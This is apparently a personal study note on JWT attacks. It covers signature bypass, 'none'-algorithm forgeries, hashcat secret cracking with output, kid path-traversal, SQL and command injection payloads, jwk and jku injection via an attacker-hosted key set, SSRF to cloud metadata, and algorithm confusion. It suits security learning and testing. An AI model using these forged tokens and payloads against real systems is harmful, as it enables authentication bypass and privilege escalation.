---
created: 2026-05-23
tags:
  - web_hacking
status: substantial
---
## JWT vulnerabilities

- JWT attacks almost always pursue one of two objectives: 
	- **Authentication bypass** — pretending to be a different user by changing claims such as `sub`, `user`, `email`, or `username`.
	- **Privilege escalation** — modifying authorization claims such as `role`, `isAdmin`, `scope`, `groups`, or `permissions` to access functionality reserved for higher-privileged accounts.

- JWTs are **self-contained**: unlike opaque session identifiers, the token carries its own state. Most JWT attacks involve **forging or tampering with that state**.
- The root cause is always **flawed verification logic**. The server either fails to verify the signature, verifies it against attacker-controlled material, verifies it with the wrong algorithm, or verifies it with a predictable secret.

>[!note] To learn more about JWTs and their structure, see [[🛠️ JWT]].

- Common JWT vulnerabilities include:
	
	- **Signature bypass flaws**
		- Not verifying the signature or accepting tokens with no signature.
	
	- **Algorithm confusion attacks**
		- Exploiting misconfigured or mishandled `alg` header to bypass signature verification.
	
	- **Weak or predictable secrets**
		- Using weak secret keys for HMAC algorithms susceptible to brute-force attacks.
	
	- **JWT header parameter manipulation**
		- Changing JOSE header parameters such as `kid` (Key ID), or `jku` (JSON Web Key URL) to perform other attacks.

- **Which attacks apply depends heavily on the signing algorithm**. Symmetric (HMAC) and asymmetric (RSA/EC) tokens fail in structurally different ways, so check the `alg` header first.

| Attack                                   | Algorithm                                                 |
| ---------------------------------------- | --------------------------------------------------------- |
| Arbitrary / missing signature            | Any `alg`                                                 |
| `none` algorithm attack                  | Any `alg` (forged `none`)                                 |
| Weak JWS secret                          | **Symmetric**: `HS256`, `HS384`, `HS512`                  |
| KID header injection (secret lookup)     | **Symmetric**: `HS256`, `HS384`, `HS512`                  |
| JWK header injection                     | **Asymmetric**: `RS256`/`RS384`/`RS512`, `PS256`, `ES256` |
| JKU header injection                     | **Asymmetric**: `RS256`/`RS384`/`RS512`, `PS256`, `ES256` |
| `x5u` / `x5c` header injection           | **Asymmetric**: `RS256`/`RS384`/`RS512`, `PS256`, `ES256` |
| KID header injection (public key lookup) | **Asymmetric**: `RS256`/`RS384`/`RS512`, `PS256`, `ES256` |
| Algorithm confusion (`RS256` → `HS256`)  | Originally asymmetric, forced to `HS256`.                 |
### Identifying JWT in the wild

- Most commonly, JWTs appear in:
	- The **`Authorization` header** with the `Bearer` scheme (e.g., `Authorization: Bearer eyJhbGciOi...`).
	- **Session cookies** (e.g., `session`, `access_token`, `id_token`, `jwt`). 
	- **Request bodies** during login or SSO flows (e.g., `access_token` or `id_token` in JSON).
	- **URL fragments** in OAuth/OIDC implicit flows (`#id_token=...`).
	- **Local/session storage** on the client.

- A JWT is recognizable by **three Base64URL-encoded segments separated by dots: `xxxxx.yyyyy.zzzzz`**. The first segment decodes to a JSON object containing an `alg` field, the second segment decodes to a JSON object with the subject claims, and the third segment is the signature (JWS).

>[!burp] The `JWT Editor` extension automatically identifies JWTs and highlights any requests containing them in green within Burp's HTTP history.

>[!burp] Burp's `HTTP history` filter supports regex searches. The pattern `eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*` matches the most JWTs (`eyJ` is the Base64URL prefix for the `{` character).
### Tooling

- The [`JWT Editor` extension](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd) (Community/Professional)
	- A comprehensive tool for analyzing and manipulating JWTs in Burp.
	- Adds a `JSON Web Token` tab in `Repeater` for decoding, editing, re-encoding, signing, and encrypting tokens.
	- Supports key generation for RSA (2048-bit by default), EC, and symmetric keys, stored in a `JWT Editor` tab accessible from Burp's top-level menu bar.
	- One-click attacks: `Embedded JWK` (JWK injection), `"none" Signing Algorithm`, `HMAC Key Confusion`, and other.

![[JWT_Repeater.png]]

- [`ticarpi/jwt_tool`](https://github.com/ticarpi/jwt_tool)
	- A Python CLI tool for JWT manipulation, automated scanning, and key cracking.
	- It complements Burp extension for tasks that don't fit the in-browser workflow.

```bash
# decode a token without verification
python3 jwt_tool.py <JWT>

# tampering mode — interactively edit claims and re-sign
python3 jwt_tool.py <JWT> -T

# run all known attacks against a live endpoint (Playbook scan)
python3 jwt_tool.py <JWT> -t https://example.com/api/me -rh "Authorization: Bearer <JWT>" -M pb

# crack an HS256 secret using a wordlist
python3 jwt_tool.py <JWT> -C -d /usr/share/wordlists/jwt.secrets.list
```

- **[`jwt.io` debugger](https://jwt.io/)** 
	- Browser-based decoder/encoder with built-in signature verification for known algorithms.

- **[`token.dev`](https://token.dev/)** 
	- Alternative debugger with broader format support.

- `hashcat`
	- Used for secret cracking; JWT mode is `16500`.

> [!warning] Never paste production tokens into a public debugger. 
>- The token's signature segment may be private to the page, but Base64URL is trivially reversible and the JSON payload typically contains user identifiers, email addresses, internal role names, and tenant IDs. 
>- Use the Burp extension or a local copy of the page for live engagements.

## Arbitrary or missing signature

- JWT security relies fundamentally on the **cryptographic signature** that guarantees token integrity and authenticity. If it's not verified — or is verified incorrectly — the payload is implicitly trusted regardless of its contents, and you can claim any identity or permission in the token.

- **Arbitrary signature**: replace the signature segment with an arbitrary string (`header.payload.ARBITRARY`).

```JS
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IjB4dHIxZ2dlciIsImlhdCI6MzQ3NTk0Nzg3MjJ9.ARBITRARY
```

- **Empty signature**: omit the signature entirely, but preserve the trailing dot (`header.payload.`).

```JS
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IjB4dHIxZ2dlciIsImlhdCI6MzQ3NTk0Nzg3MjJ9. // no signature at all
```

- If either returns the same authenticated response as a valid token, signature verification is broken; you can swap in any claims you like without touching anything else.
### Why signature verification fails

- **Improper use of JWT libraries** (most common one)

	- Many JWT libraries provide **two distinct methods** for working with tokens:
		- `decode()`: Parses the JWT and returns the Base64URL-decoded payload **without** verifying the signature.
		- `verify()`: Validates the signature against a given key and returns the payload only if the signature is valid.
	- Sometimes developers confuse these two and only use `decode()` to extract claims, skipping signature verification entirely.

> [!example]+
> ```JS
> const jwt = require("jsonwebtoken");
> const token = req.headers['authorization'].split(" ")[1];
> 
> // decodes payload, does NOT verify signature
> const payload = jwt.decode(token);
> 
> if (payload && payload.role === "admin") {
>   // attacker can send a token with {"role": "admin"} in the payload and provide an arbitrary (or absent) signature
>   performAdminAction();
> }
> ```

- **Flawed custom verification**
	- Developers may implement custom JWT parsers that inadvertently skip signature verification — rather than using well-tested libraries.

>[!example]+
> ```Python
> import base64
> import json
> 
> def parse_jwt(token):
>     header_b64, payload_b64, signature_b64 = token.split('.')
>     payload_json = base64.urlsafe_b64decode(payload_b64 + '=')
>     payload = json.loads(payload_json)
>     # no signature verification at all
>     return payload
> ```

- **Failing to catch validation errors properly**
	- Even when `verify()` is used, incorrect exception handling can defeat the protection.
	- For example, catching verification exceptions but then falling back to decoding the token without signature verification.

>[!example]+
> ```JS
> const jwt = require("jsonwebtoken");
> 
> try {
>   const payload = jwt.verify(token, PUBLIC_KEY, { algorithms: ["RS256"] });
>   // valid
> } catch (err) {
>   // fallback to decode rather than rejecting
>   const payload = jwt.decode(token); 
>   // attacker just forges token, gets in anyway
> }
> ```

- **Skipping verification under certain conditions**
	- Some applications disable verification in development or staging environments and rely on environment flags to re-enable it in production.

>[!example]+
> ```js
> if (process.env.NODE_ENV !== "production") {
>     return jwt.decode(token); // verification skipped in dev/staging
> }
> return jwt.verify(token, key);
> ```

- If the production deployment inherits a misconfigured environment variable, the fallback path triggers.
## The `none` algorithm attack

- [`RFC 7518`](https://datatracker.ietf.org/doc/html/rfc7518#section-3.6) defines `"none"` as a legitimate JWS algorithm: it explicitly indicates that the JWS is unsecured and carries no signature. 
- This option was originally intended for **debugging**. Many libraries implement `none` to remain RFC-compliant.
- If the server **trusts the value of the `alg` parameter in the token header** to select the verification algorithm without enforcing a whitelist, you can **set `alg` to `none`, strip the signature, and bypass the signature check entirely**.

>[!example]+
>- Suppose the original token looks like this:
> ```JS
> eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiMHh0cjFnZ2VyIiwiaWF0IjozNDc1OTQ3ODcyMn0.aqzuiVcnMoKYPg5_vZ-OYeRpk93b02q7qvau8g6k650
> ```
> 
> ```JS
> // header:
> {
>   "alg": "HS256",
>   "typ": "JWT"
> }
> // + payload:
> {
>   "name": "0xtr1gger",
>   "iat": 34759478722
> }
> // + signature
> ```
> 
>- If the server is susceptible to none algorithm attacks, the attacker can escalate privileges by crafting the token this way:
>```JS
>eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJuYW1lIjoiYWRtaW4iLCJpYXQiOjM0NzU5NDc4NzIyfQ.
>```
> ```JS
> // header:
> {
>   "alg": "none", // the server trusts this alue
>   "typ": "JWT"
> }
> // + payload:
> {
>   "name": "admin",
>   "iat": 34759478722
> }
> // + empty (entirely missing) signature
> ```
> 

>[!tip]+ Bypassing `none` blacklists 
> - `None`
> - `NONE`
> - `nOnE`
> - `nonE`
> - `NoNe`
> - `\u006eone` (Unicode-escaped `n`)
> - An empty string `""`
> 
>>[!note] If `alg` is missing entirely, some libraries default to `HS256` rather than failing.

## Symmetric algorithm attacks (HMAC)

Applies to `HS256`/`HS384`/`HS512`. The same secret both signs and verifies — so anyone who obtains or guesses it can forge arbitrary tokens.
### Weak or predictable JWS secrets

- When a JWT is signed using a **symmetric algorithm** — most commonly HMAC (`HS256`, `HS328`, `HS512`) — the same secret key is used to both sign and verify the token.
- If the secret is weak or predictable, you can attempt **cracking it offline** — using tools like `hashcat`.

>**[HMAC (Hash-Based Authentication Code)](https://en.wikipedia.org/wiki/HMAC)** uses a shared secret key plus a cryptographic hash function to verify both the **data integrity** and **authenticity** of a message.

>[!interesting]- Weak / predictable JWS secret vulnerabilities occur when developers:
> - Copy-paste example (or AI-generated) code snippets containing placeholder secrets like `"secret"`, `"your-256-bit-secret"`, or `"changeme"` and ship them to production (oops).
> - Choose human-memorable values during development that never get rotated.
> - Accidentally commit secret files to a public repository.
> - Use default secrets.
#### Cracking secrets with `hashcat`

- Offline brute-force attack against an HMAC-signed JWT using `hashcat`:

```bash
hashcat -a 0 -m 16500 <JWT> <wordlist>
```

>[!note]+ Option breakdown
>- `-a 0`: Straight (dictionary) attack mode.
>- `-m 16500`: Hash mode for JWT (`HS256`/`HS384`/`HS512` are auto-detected from the token header).

>[!interesting] `hashcat` computes the signature for the JWT header and payload using each candidate secret from the wordlist, then compares the resulting value against the original token signature. If the values match, a correct secret is found. 

- **Useful wordlists**:
	- [`wallarm/jwt-secrets`](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list)
	- [`SecLists/Passwords/scraped-JWT-secrets.txt`](https://github.com/danielmiessler/SecLists/blob/master/Passwords/scraped-JWT-secrets.txt)

>[!important] The attack runs entirely **offline**. `hashcat` does not interact with the target application or send requests to the server; all candidate secrets are tested locally against the captured token signature. This is why this attack is fast even when you use a very large wordlist.

- Apply a rule file to mutate the wordlist (e.g., add digits, capitalize):

```bash
hashcat -a 0 -m 16500 <JWT> jwt.secrets.list -r /usr/share/hashcat/rules/best64.rule
```

- Brute-force all 6-character lowercase secrets (mask mode):

```bash
hashcat -a 3 -m 16500 <JWT> ?l?l?l?l?l?l
```

- Resume an interrupted session:

```bash
hashcat --restore
```

> [!example]-
> 
> ```bash
> hashcat -a 0 -m 16500 eyJraWQiOiJmY2IwODE1MC05N2E3LTQzNWUtYjQ3Ny1iYzRiZmEyZTE0Y2IiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3OTYxODQ2Mywic3ViIjoid2llbmVyIn0.SK7cpxhYb0ioBAu-Vfk3rLm_Q2_IFfaKSPb-FxFHpmM jwt.secrets.list
> ```
> 
> ```bash
> hashcat (v6.2.6) starting
> 
> OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
> ==================================================================================================================================================
> * Device #1: pthread-haswell-AMD EPYC 7543 32-Core Processor, skipped
> 
> OpenCL API (OpenCL 2.1 LINUX) - Platform #2 [Intel(R) Corporation]
> ==================================================================
> * Device #2: AMD EPYC 7543 32-Core Processor, 3904/7872 MB (984 MB allocatable), 4MCU
> 
> Minimum password length supported by kernel: 0
> Maximum password length supported by kernel: 256
> 
> Hashes: 1 digests; 1 unique digests, 1 unique salts
> Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
> Rules: 1
> 
> Optimizers applied:
> * Zero-Byte
> * Not-Iterated
> * Single-Hash
> * Single-Salt
> 
> Watchdog: Hardware monitoring interface not found on your system.
> Watchdog: Temperature abort trigger disabled.
> 
> Host memory required for this attack: 1 MB
> 
> Dictionary cache hit:
> * Filename..: jwt.secrets.list
> * Passwords.: 103965
> * Bytes.....: 1231757
> * Keyspace..: 103965
> 
> eyJraWQiOiJmY2IwODE1MC05N2E3LTQzNWUtYjQ3Ny1iYzRiZmEyZTE0Y2IiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3OTYxODQ2Mywic3ViIjoid2llbmVyIn0.SK7cpxhYb0ioBAu-Vfk3rLm_Q2_IFfaKSPb-FxFHpmM:secret1
>                                                           
> Session..........: hashcat
> Status...........: Cracked
> Hash.Mode........: 16500 (JWT (JSON Web Token))
> Hash.Target......: eyJraWQiOiJmY2IwODE1MC05N2E3LTQzNWUtYjQ3Ny1iYzRiZmE...xFHpmM
> Time.Started.....: Sun May 24 04:42:39 2026 (0 secs)
> Time.Estimated...: Sun May 24 04:42:39 2026 (0 secs)
> Kernel.Feature...: Pure Kernel
> Guess.Base.......: File (jwt.secrets.list)
> Guess.Queue......: 1/1 (100.00%)
> Speed.#2.........:  1477.0 kH/s (1.25ms) @ Accel:512 Loops:1 Thr:1 Vec:8
> Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
> Progress.........: 2048/103965 (1.97%)
> Rejected.........: 0/2048 (0.00%)
> Restore.Point....: 0/103965 (0.00%)
> Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1
> Candidate.Engine.: Device Generator
> Candidates.#2....:  -> everybody knows it
> 
> Started: Sun May 24 04:42:38 2026
> Stopped: Sun May 24 04:42:40 2026
> ```
> 
> - `hashcat` outputs the secret in the format `JWT:SECRET`:
> 
> ```bash
> eyJraWQiOiJmY2IwODE1MC05N2E3LTQzNWUtYjQ3Ny1iYzRiZmEyZTE0Y2IiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3OTYxODQ2Mywic3ViIjoid2llbmVyIn0.SK7cpxhYb0ioBAu-Vfk3rLm_Q2_IFfaKSPb-FxFHpmM:secret1
> ```
> 
> - In this example, the secret is `secret1`.

>[!bug]+ Labs
>- [[🛠️ JWT attack labs#3. JWT authentication bypass via weak signing key]].

>[!note]+ Brute-forcing short secrets with `jwt-cracker`
> - [`jwt-cracker`](https://github.com/lmammino/jwt-cracker) attempts all combinations of a given character set up to a specified maximum length. It is useful only for very short or restricted-charset secrets.
> 
> ```bash
> node index.js <JWT> "abcdefghijklmnopqrstuvwxyz0123456789" 6
> ```
> 
> - For anything beyond six lowercase-alphanumeric characters, brute-force becomes impractical in human timeframes; switch to mask or wordlist attacks with `hashcat`.
> 
#### Forging the token

- Once the secret is known, modify the token however you want and re-sign it:

1. Create a key from the recovered secret (`JWT Editor` -> `Keys` -> `New Symmetric Key`, then paste the cracked secret into the `k` field — or `Generate` a key and overwrite `k`). The algorithm must match the one used in the original token.

![[keys_tab.png]]
![[secret_generated.png]]

2. Craft the forged JWT with desired claims (`Repeater` -> `JSON Web Token`).

![[modify_payload.png]]

3. Sign the token using the symmetric key you created (`Sign` -> select your key).

![[sign.png]]

4. Send the request. 

### KID header injection

> **KID (Key ID)** A string identifier in the JOSE header that allows the verifier to select the correct verification key when multiple are available. [`RFC 7515`](https://datatracker.ietf.org/doc/html/rfc7515#section-4.1.4) deliberately leaves the value's structure unspecified — it can be any string the application chooses.

```JSON
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "arbitrary_string" // Key ID
}
```

- Because `kid` is an opaque string, applications use it for whatever lookup mechanism is convenient. Common patterns:
	- Index into an in-memory key dictionary.
	- Filename in a key directory: `keys/${kid}.pem`.
	- Primary key of a database row: `SELECT secret FROM keys WHERE kid = ?`
	- URL fragment, environment variable, configuration key, etc.
- Every one of these is an injection vector; the `kid` parameter may be vulnerable to:
	- Path traversal (`"kid": "../../key.json"`).
	- SQL injection (`"kid": "' OR 1=1--"`).
	- Command injection  (`"kid": "id; sleep 5"`).
#### Path traversal

- When `kid` selects a file by path, you can inject `../` sequences to read keys from arbitrary locations on disk:

```json
{ "alg": "HS256", "typ": "JWT", "kid": "../../../../etc/passwd" }
```

- This rarely yields a usable signing key by itself — the file's contents would need to match the HMAC secret bit-for-bit. 
- The more powerful variant uses a file whose contents are _known and predictable_: an empty file, a static asset, or a file you can write to via a separate vulnerability.

---
- For example, `/dev/null` reads a an empty string. If the application treats the file contents as the HMAC secret, the secret is the empty string. Sign the forged token with `HS256` and an empty key, and the server will validate it.

```json
{ "alg": "HS256", "typ": "JWT", "kid": "../../../../dev/null" }
```

>[!example]+ Example of vulnerable code
> ```python
> kid = jwt_header['kid'] # attacker input
> key_path = "/keys/" + kid # not validated
> with open(key_path, 'r') as f:
>     secret = f.read()
> ```

> [!note] In Burp's JWT Editor, the empty-key forgery requires creating a symmetric key where the `k` field is the Base64URL encoding of an empty string `""`. 

- Some library versions reject empty keys; if so, try a single-character known file like `/proc/sys/kernel/randomize_va_space` (returns `2\n` on most Linux installs).

>[!bug]+ Labs
>- [[🛠️ JWT attack labs#6. JWT authentication bypass via `kid` header path traversal]].
#### SQL injection

- When `kid` becomes part of a SQL query, classic SQL injection applies:

```json
{
    "alg": "HS256",
    "typ": "JWT",
    "kid": "key1' UNION SELECT 'AAAAAA' -- "
}
```

> [!example]+ Example of vulnerable code
> ```python
> cursor.execute(f"SELECT secret FROM keys WHERE kid='{kid}'")
> secret = cursor.fetchone()[0]
> ```

- `UNION SELECT 'AAAAAA'` returns a known attacker-controlled string as the "secret". Sign the JWT with `AAAAAA` as the HMAC key, and the server retrieves that same string from the union and validates the signature.

#### Command injection

- If the application shells out to a command using `kid` (rare but documented), classic shell-injection patterns apply: backticks, `$()`, `;`, `|`, and so on. Treat `kid` as untrusted input subject to all injection classes the lookup mechanism supports.
## Asymmetric algorithm attacks (RSA/EC)

Applies to `RS256`/`RS384`/`RS512`, `PS256`, `ES256`, etc. The server holds a private key for signing and a public key for verification — the public key isn't secret by design, but these attacks target _how the server decides which public key to trust_.
### JWK header injection

#### JWK

> **JWK (JSON Web Key)** is a JSON data structure defined in [`RFC 7517`](https://datatracker.ietf.org/doc/html/rfc7517) that represents a cryptographic key as a set of named parameters (e.g., `kty`, `n`, `e` for RSA; `kty`, `crv`, `x`, `y` for elliptic curve).

- The `jwk` JOSE header parameter ([`RFC 7515 §4.1.3`](https://datatracker.ietf.org/doc/html/rfc7515#section-4.1.3)) lets the sender embed the public key used for signature verification **directly in the token header**. 
- This is useful in highly dynamic distributed environments where keys rotate frequently and maintaining a central key store is impractical.

>[!example]+
>- A JWT header with an embedded JWK:
> ```JSON
> {
>   "alg": "RS256",
>   "typ": "JWT",
>   "jwk": {
>     "kty": "RSA",
>     "kid": "1234",
>     "e": "AQAB",
>     "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m..."
>   }
> }
> ```

>[!interesting]+ Common JWK parameter
> - `kty`: Key type (`RSA`, `EC`, `oct`).
> - `kid`: Key ID (used to match keys).
> - `e`, `n`: RSA public exponent and modulus.
> - `crv`, `x`, `y`: Elliptic curve parameters.
> - `use`: Intended usage (`sig` or `enc`).
> - `alg`: Algorithm (should match the top-level alg).

>[!warning] Private key material (`d`, private `x`, etc.) must **never** appear in a `jwk` exposed to end users.

- So, an application would parse the `jwk` parameters from the token header and convert them into a public key object, then use that key to verify the token's signature.
- If the application trusts a `jwk` supplied by an end user, you can **inject your own public key**.

>[!example]- Vulnerable / secure code (Node.js)
>- Vulnerable code pattern (Node.js):
> ```js
> function insecureVerify(token) {
>     const decodedHeader = JSON.parse(
>         Buffer.from(token.split(".")[0], "base64").toString()
>     );
>     const jwk = decodedHeader.jwk;
>     const pubkey = jwkToPem(jwk); // attacker-controlled key material
>     return jwt.verify(token, pubkey, { algorithms: [decodedHeader.alg] });
> }
> ```
> - Secure code pattern:
> ```js
> function secureVerify(token, trustedKeys) {
>     const decodedHeader = parseJwtHeader(token);
>     const pubkey = trustedKeys[decodedHeader.kid]; // looked up from trusted store
>     if (!pubkey) throw new Error("unknown key");
>     return jwt.verify(token, pubkey, { algorithms: ["RS256"] });
> }
> ```
#### JWK header injection

1. Generate an asymmetric key pair, such as RSA 2048-bit (`JWT Editor` -> `New RSA key` -> `Generate`).

![[rsa.png]]

2. Craft the forged JWT with desired claims (`Repeater` -> `JSON Web Token`).
3. Embed your public key as a `jwk` parameter in the JWT header (`Attack` -> `Embedded JWK` -> select your key).

![[embedded_jwk.png]]
![[embedded_jwk_select_key.png]]

4. Sign the token using your corresponding private key (`Sign` -> select your key).
5. Send the request.

![[images/walkthrough/PortSwigger/JWT/lab4/2.png]]

>[!bug]+ Labs
>- [[🛠️ JWT attack labs#4. JWT authentication bypass via jwk header injection]].

### JKU header injection

#### JKU

> **JKU (JWK Set URL)** is a JOSE header parameter (`jku`) that contains a URL pointing to a **JWK Set** — a JSON document containing one or more JWKs under a `keys` array.

- `jku` was created ([`RFC 7515`](https://datatracker.ietf.org/doc/html/rfc7515#section-4.1.3)) for federated systems and microservces where signing keys can change over time. 
- The verifier fetches the JWK Set from the `jku` URL and selects the key matching the `kid`.
- For example, OAuth 2.0 authorization servers publish their signing keys at well-known URLs (commonly `/.well-known/jwks.json`).

> [!example]+
> - Example header:
> ```json
> {
>     "alg": "RS256",
>     "typ": "JWT",
>     "jku": "https://auth.example.com/.well-known/jwks.json",
>     "kid": "rotating-key-2026-q2"
> }
> ```
> 
> - Example JWK Set (`https://auth.example.com/.well-known/jwks.json`):
> 
> ```json
> {
>     "keys": [
>         {
>             "kty": "RSA",
>             "kid": "rotating-key-2026-q2",
>             "use": "sig",
>             "alg": "RS256",
>             "n": "...",
>             "e": "AQAB"
>         }
>     ]
> }
> ```

- If the application trusts URLs in a `jku` parameter supplied by an end user without verifying the domain, you can **host your own JWK Set** with your public key and **point the `jku` at that location**.
#### JKU header injection

1. Generate an asymmetric key pair, such as RSA 2048-bit (`JWT Editor` -> `New RSA key` -> `Generate`).

![[rsa.png]]

2. Build a JWK Set from the parameters: `jty`, `e`, `kid`, and `n`.

```JSON
{
    "keys": [
		{
			"kty": "RSA",
			"e": "AQAB",
			"kid": "16f7d2d3-079b-4940-8d0f-78b51754c827",
			"n": "n_LKOp1LoUQN7Z8IJnopvw_Ovkf-vaDUMj24EFUPkNSFQWeI2FHJG1ezBmiBclzR8U8gFEfs6CoECVL277d43FxVPfDkDlIKOribrSPo7l-6zdVxETMQBIFEGTIZEXq9-UMAiAYGYTerZHvhPDdP72KZvuXgMgnp-HrlaIfSEqPvYI1tEANsCL0T350cR3KNs7OZQvH92CCJgJ2r8Yd9RgJmv-msooClpPHkWXudTo1WTiMBamZbqrwpqFVmbb5NKVuR-yZnC19yHpsRKhZuI15IX18LgtDXreHVSQIYQwHNHkSM1Nu_P_k-ArsBH5ou5LjH2ImEfqmKvJH-p9j7_Q"
		}
    ]
}
```

3. Host the JWK Set at a URL you control (e.g., `https://attacker.com/exploit/jwks.json`).
4. Craft the forged JWT with desired claims (`Repeater` -> `JSON Web Token`).
5. Point the `jku` parameter at where your JWK SET is hosted, then set a matching `kid` parameter:

```JSON
{  
	"alg": "RS256",
	"typ": "JWT",		
    "kid": "16f7d2d3-079b-4940-8d0f-78b51754c827",  
    "jku": "https://attacker.com/exploit/jwks.json"
      
}
```

4. Sign the token using your corresponding private key (`Sign` -> select your key).
5. Send the request.

 >[!bug]+ SSRF via `jku`
> - Because the server makes an HTTP request to the `jku` URL, it doubles as a vector for blind server-side request forgery (see [[SSRF]].
> - Point `jku` at internal addresses (`http://localhost:8080/admin`, `http://169.254.169.254/latest/meta-data/` on AWS) and observe response times, error messages, or out-of-band callbacks. 
> - The `x5u` parameter (X.509 URL) shares the same dual purpose and the same exploitation pattern.

>[!tip]+ If the server validates the `jku` URL, attempt to bypass this using techniques from [[SSRF#Bypassing validation]].

>[!bug]+ Labs
>- [[🛠️ JWT attack labs#5. JWT authentication bypass via jku header injection]].

## Algorithm confusion attacks

>**Algorithm confusion attacks**, or **key confusion attacks**, occur when an attacker is able to force the server to verify the signature of a JWT using a different algorithm than was initially intended by the developers.

### The `RS256`-to-`HS256` confusion

- The canonical algorithm confusion attack swaps asymmetric `RS256` for symmetric `HS256` while keeping the same key material:
	- **`RS256`** uses an RSA key pair.
		- The server stores the **private key** for signing and **public key** for verification. 
		- The public key is, by definition, not secret — it may appear in JWKS endpoints, OpenID Connect discovery documents, X.509 certificates, or Git history.
	- **`HS256`** uses a symmetric key. 
		- The server uses the same key for signing and verification.
---
- If the server loads a key blob and JWT, trusts the `alg` from the JWT header to choose the algorithm, and then passes both the key and the JWT to the verification algorithm, it is susceptible to **algorithm confusion attacks**.
	1. Initially, the verification algorithm is set to `RS256` (`"alg": "RS256"`). To verify the signature, server uses the public key you know (e.g., found in a JWKS document).
	2. You change the `alg` parameter to `HS256` (`"alg": "HS256"`), tamper with the payload, and **sign the token using the known public key**.
	3. The server trusts the `alg` parameter and uses `HS256` to verify the token; the verification key remains the same, so **the token is verified against the public RSA key** you used to sign the token.

## Testing methodology
 
```mermaid
flowchart TD
    A[Capture JWT] --> B{alg header value}
    B -->|HS256/384/512| C[Symmetric path]
    B -->|RS256/384/512, PS256, ES256| D[Asymmetric path]
 
    C --> U1[Try none algorithm]
    C --> U2[Try arbitrary / empty signature]
    U1 --> C3[Brute-force secret: hashcat -m 16500]
    C3 --> C4[Inspect kid: path traversal / SQLi / cmd injection]
 
    D --> U3[Try none algorithm]
    D --> U4[Try arbitrary / empty signature]
    U3 --> D3[Try jwk header injection]
    D3 --> D4[Try jku header injection]
    D4 --> D5[Try x5u / x5c header injection]
    D5 --> D6[Try algorithm confusion RS256 to HS256]
    D6 --> D6a{Public key exposed in token/response?}
    D6a -->|Yes| E1[Sign with key bytes as HMAC secret — try both PKCS1 and X.509]
    D6a -->|No| E2[Hunt: well-known paths, OIDC discovery, TLS cert, JS/mobile leaks]
    E2 --> E1
```
 
- Regardless of algorithm, **always try the universal attacks first** (`none`, arbitrary/empty signature). Only after those fail does the algorithm split matter.
## References and further reading

- [`JWT attacks — PortSwigger Web Security Academy`](https://portswigger.net/web-security/jwt)
- [`JWT - JSON Web Token — swisskyrepo/PayloadsAllTheThings`](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token)

- [`The Ultimate Guide to JWT Vulnerabilities and Attacks (with Exploitation Examples) — PentesterLab`](https://pentesterlab.com/blog/jwt-vulnerabilities-attacks-guide)
- [`JWT (JSON Web Token): Vulnerabilities, Common Attacks and Security Best Practices — Vaadata`](https://www.vaadata.com/blog/jwt-json-web-token-vulnerabilities-common-attacks-and-security-best-practices/#jwt-signature-not-verified) 
- [`JSON Web Token Attacks And Vulnerabilities — Acunetix`](https://www.acunetix.com/blog/articles/json-web-token-jwt-attacks-vulnerabilities/)
- [`JWT Vulnerabilities (JSON Web Tokens) — HackTricks`](https://hacktricks.boitatech.com.br/pentesting-web/hacking-jwt-json-web-tokens)
- [`Testing JSON Web Tokens — OWASP Web Application Security Testing Guide`](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens)

---

- https://openid.net/specs/draft-jones-json-web-signature-04.html
- https://www.loginradius.com/blog/engineering/guest-post/what-are-jwt-jws-jwe-jwk-jwa/
- https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology

- https://medium.com/swlh/hacking-json-web-tokens-jwts-9122efe91e4a
- https://www.loginradius.com/blog/engineering/jwt-signing-algorithms/

- https://www.thehacker.recipes/web/inputs/jwt
- https://portswigger.net/web-security/jwt
- https://systemweakness.com/deep-dive-into-jwt-attacks-efc607858af6
- https://www.thehacker.recipes/web/inputs/jwt
- https://github.com/KathanP19/HowToHunt/blob/master/JWT/OLD_JWT_ATTACK_Notes.md
- https://i.blackhat.com/BH-US-23/Presentations/US-23-Tervoort-Three-New-Attacks-Against-JSON-Web-Tokens-whitepaper.pdf
- https://token.dev/

 >[!note] If you want to learn more about some of this cryptographic terminology we discussed and math behind it, I recommend the book "An Introduction to Mathematical Cryptography" by J.H. Silverman, Jill Pipher, and Jeffrey Hoffstein — [link](https://link.springer.com/book/10.1007/978-0-387-77993-5). 
 
- To do:
	- `x5u` and `x5c` header injection
